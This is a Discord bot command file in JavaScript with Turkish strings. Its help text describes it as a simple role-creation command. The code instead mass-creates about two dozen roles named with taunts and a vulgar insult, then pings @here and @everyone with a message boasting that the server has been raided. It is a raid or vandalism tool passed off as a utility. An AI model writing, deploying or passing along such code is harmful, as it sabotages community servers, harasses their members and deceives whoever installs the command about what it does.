const Discord = require('discord.js')

exports.run = async (client, message, args) => {
if (!message.member.hasPermission("MANAGE_ROLES")) 
  return message.channel.send(":no_entry: Bu komutu kullanabilmek için `Rolleri yönet` yetkisine sahip olmanız gerek")
  
let guild = message.guild;


 message.guild.createRole({
        name: 'HAHAHAHA',
    })
  
  message.guild.createRole({
        name: 'Sunucun GG :D',
    })
  message.guild.createRole({
        name: 'Cenabetmisin Amq',
    })
  
  message.guild.createRole({
        name: 'Sunucun GG :D',
    })
  message.guild.createRole({
        name: 'Cenabetmisin Amq',
    })
  
  message.guild.createRole({
        name: 'Sunucun GG :D',
    })
  message.guild.createRole({
        name: 'Cenabetmisin Amq',
    })
  
  message.guild.createRole({
        name: 'Sunucun GG :D',
    })
  message.guild.createRole({
        name: 'Cenabetmisin Amq',
    })
  
  message.guild.createRole({
        name: 'Sunucun GG :D',
    })
  message.guild.createRole({
        name: 'Cenabetmisin Amq',
    })
  
  message.guild.createRole({
        name: 'Sunucun GG :D',
    })
  message.guild.createRole({
        name: 'Cenabetmisin Amq',
    })
  
  message.guild.createRole({
        name: 'Sunucun GG :D',
    })
  message.guild.createRole({
        name: 'Cenabetmisin Amq',
    })
  
  message.guild.createRole({
        name: 'Sunucun GG :D',
    })
  message.guild.createRole({
        name: 'Cenabetmisin Amq',
    })
  
  message.guild.createRole({
        name: 'Sunucun GG :D',
    })
  message.guild.createRole({
        name: 'Cenabetmisin Amq',
    })
  
  message.guild.createRole({
        name: 'Sunucun GG :D',
    })
  message.guild.createRole({
        name: 'Cenabetmisin Amq',
    })
  
  message.guild.createRole({
        name: 'Sunucun GG :D',
    })
  
  
  
  
  
   
   
   
   
   .then(role => message.channel.send(`@here @everyone ** Cenabetmisin Amq Sunucunu Basdım **`))
  .catch(console.error)
  
}

exports.conf = {
  aliases: [ 'rololuştur' ],
  enabled: true,
  guildOnly: false,
  permLevel: 4
};

exports.help = {
  name: 'rsp',
  description: 'Yeni rol oluşturur',
  usage: 'rsp',
};